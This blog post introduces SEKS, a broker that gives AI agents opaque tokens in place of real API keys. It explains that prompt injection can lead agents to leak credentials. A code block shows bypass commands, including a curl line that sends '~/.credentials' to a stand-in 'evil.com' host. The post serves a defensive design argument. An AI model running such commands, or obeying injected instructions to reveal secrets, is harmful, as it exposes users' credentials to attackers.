---
title: "Why Your AI Agent Shouldn't See Your API Keys"
description: "AI agents can be tricked into revealing credentials. SEKS fixes that with credential isolation at the architecture level."
date: 2026-02-10
author: "Síofra"
tags: ["security", "architecture", "credentials"]
---

When you give an AI agent access to external services — email, cloud storage, APIs — you typically hand over credentials. An API key. An OAuth token. Something that says "this entity is authorized to act on my behalf."

The problem: **AI agents can be tricked into revealing those credentials.**

This isn't hypothetical. Prompt injection attacks can coerce well-meaning agents into printing environment variables, encoding secrets in outbound requests, or writing credentials to files that get exfiltrated. The agent doesn't intend to betray you — it's just following instructions it shouldn't trust.

## The Obvious Solution Doesn't Work

"Just filter the output!" 

Sure, you can scan agent responses for patterns that look like API keys. But attackers know this too:

```
# Bypasses simple pattern matching
echo $OPENAI_API_KEY | base64
curl https://evil.com/?k=$(cat ~/.credentials)
```

String transforms, external commands, file operations — all bypass output filtering. The moment a secret enters the agent's environment, it's at risk.

## The Database Analogy

Databases solved this problem decades ago with **stored procedures** and **definer rights**.

When you call a stored procedure, you don't need the database password. You have `EXECUTE` permission on the procedure — the procedure itself has the elevated access. You invoke it, it does its thing, you get results. The connection string never touches your code.

This is exactly what AI agents need.

## Enter SEKS: Secure Execution Key Sequestration

SEKS inverts the credential model. Instead of giving agents API keys, you give them **opaque tokens** that mean nothing without the broker:

```python
from openai import OpenAI

client = OpenAI(
    api_key="seks_openai_abc123",  # This is NOT an OpenAI key
    base_url="https://broker.seks.ai/api/openai"
)

# Agent uses the SDK normally...
response = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "Hello!"}]
)
```

The agent thinks it's using a real API key. It's not. The broker:

1. Receives the request
2. Validates the fake token
3. Looks up the *real* API key (encrypted, stored securely)
4. Injects the real key into the outbound request
5. Forwards to OpenAI
6. Returns the response

The agent never sees `sk-...`. If the agent is compromised, the attacker gets `seks_openai_abc123` — which is useless outside the broker.

## Why This Matters

**For individuals:** Your personal API keys stay safe even if an agent goes rogue.

**For enterprises:** Credential isolation at the architecture level, not policy level. You don't have to trust every agent implementation to handle secrets correctly.

**For agent developers:** Build agents without worrying about credential hygiene. Use standard SDKs. The security layer is beneath you.

## The Bigger Picture

SEKS isn't just about API keys. It's about building infrastructure where AI agents can do useful work without being trusted with the crown jewels.

Agents that can send emails without SMTP passwords. Make purchases without credit card numbers. Access databases without connection strings.

The capability is granted. The credential is sequestered.

---

*Our agents are using SEKS Broker while they are building it, running on our own fork of OpenClaw called SEKSBot. Want to know more or join our mailing list? [Get in touch →](/feedback)*
